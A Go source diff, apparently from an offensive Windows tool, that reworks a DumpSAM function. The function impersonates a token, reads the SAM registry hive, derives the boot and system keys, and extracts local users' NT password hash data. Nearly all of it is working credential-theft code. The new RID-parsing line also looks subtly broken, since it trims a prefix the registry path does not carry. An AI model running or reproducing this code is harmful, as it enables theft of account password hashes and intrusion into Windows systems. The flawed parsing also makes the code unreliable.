@@ -7,11 +7,12 @@ import (
 	"encoding/binary"
 	"encoding/hex"
 
-	"github.com/jfjallid/go-smb/smb/encoder"
+	// "github.com/jfjallid/go-smb/smb/encoder"
 	"golang.org/x/sys/windows"
 
-	// "strings"
+	"strings"
 	// "log"
+	"strconv"
 	"golang.org/x/sys/windows/registry"
 )
 
@@ -31,22 +32,24 @@ func TestRegAccess(token windows.Token) error {
 	return nil
 }
 
-func DumpSAM(token windows.Token) (error) {
+func DumpSAM(token windows.Token) ([]*sam_account, error) {
+	var acc []*sam_account
 	err := InjectToken(token)
 	if err != nil {
-		return err
+		return acc, err
 	}
+	
 	key, err := registry.OpenKey(registry.LOCAL_MACHINE, `SAM\SAM\Domains\Account\Users`, registry.READ)
 	defer  key.Close()
 	sub_keys, _ := key.ReadSubKeyNames(-1)
 	BootKey, err := GetBootKey(token) // Get Boot Key
 	// fmt.Println(BootKey)
 	if err != nil {
-		return err
+		return acc, err
 	}
-	fmt.Println(hex.EncodeToString(BootKey))
+	// fmt.Println(hex.EncodeToString(BootKey))
 	systemKey, err := GetSysKey(token, BootKey)
-	fmt.Println(hex.EncodeToString(systemKey))
+	// fmt.Println(hex.EncodeToString(systemKey))
 	for _, k := range sub_keys{
 		k = fmt.Sprintf(`SAM\SAM\Domains\Account\Users\%s`, k)
 		sub_k, _ := registry.OpenKey(registry.LOCAL_MACHINE, k, registry.READ)
@@ -54,39 +57,21 @@ func DumpSAM(token windows.Token) (error) {
 		sub_k_data_len := len(sub_k_data)
 		if sub_k_data_len > 1 {
 			v, _, _ := sub_k.GetBinaryValue("V")
-			// F, _, _ := sub_k.GetBinaryValue("F")
-			offsetName := binary.LittleEndian.Uint32(v[0x0c:]) + 0xcc
-			szName := binary.LittleEndian.Uint32(v[0x10:])
-			Username, _ := encoder.FromUnicodeString(v[offsetName : offsetName+szName])
-			szNT := binary.LittleEndian.Uint32(v[0xac:])
-			offsetHashStruct := binary.LittleEndian.Uint32(v[0xa8:]) + 0xcc
-			Data := []byte{}
-			var offsetIV uint32
-			if 0x14 == szNT {
-				szNT -= 4
-				offsetNT := offsetHashStruct + 4
-				Data = v[offsetNT : offsetNT+16]
-				
-			} else if 0x38 == szNT {
-				offsetIV = offsetHashStruct + 8
-				offsetNT := offsetHashStruct + 24
-				Data = v[offsetIV : offsetNT+16]
-			} else if 0x18 == szNT{
-				Data = []byte{}
-			} else if szNT == 0x4 {
-				Data = []byte{}
-			}
-			var decrypted []byte
+			rid := strings.TrimPrefix(k, "000003E9") // Remove common prefix
+			ridInt, _ := strconv.ParseInt(rid, 16, 32)
+			data := GetNT(v, uint32(ridInt), systemKey)
+			acc = append(acc, &data)
 
-			fmt.Printf("%s\\%s\n", Username, hex.EncodeToString(decrypted))
+
 
 		}
 	}
 	
 
-	return nil
-
+	return acc, nil
 }
+
+
 func GetBootKey(token windows.Token) (result []byte, err error) {
 	err = InjectToken(token) // inject token
 	if err != nil {
